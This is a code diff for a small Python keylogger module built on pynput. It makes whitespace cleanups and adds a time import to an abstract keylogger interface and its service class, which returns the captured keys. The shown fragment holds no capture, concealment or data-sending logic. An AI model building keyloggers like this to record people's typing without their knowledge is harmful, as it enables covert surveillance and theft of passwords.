@@ -1,19 +1,20 @@
 from pynput.keyboard import Listener,Key
 from abc import ABC, abstractmethod
 from typing import List
+import time
 
-class IKeyLogger(ABC): 
-    @abstractmethod 
+class IKeyLogger(ABC):
+    @abstractmethod
     def start_logging(self) -> None: 
-        pass 
+        pass
      
-    @abstractmethod 
+    @abstractmethod
     def stop_logging(self) -> None: 
-        pass 
+        pass
      
-    @abstractmethod 
+    @abstractmethod
     def get_logged_keys(self) -> List[str]: 
-        pass 
+        pass
 
 
 
@@ -40,5 +41,4 @@ class KeyLoggerService (IKeyLogger):
             print("Logging stopped!")
 
     def get_logged_keys(self) -> List[str]:
-        return self.logged_keys
-    
+        return self.logged_keys 
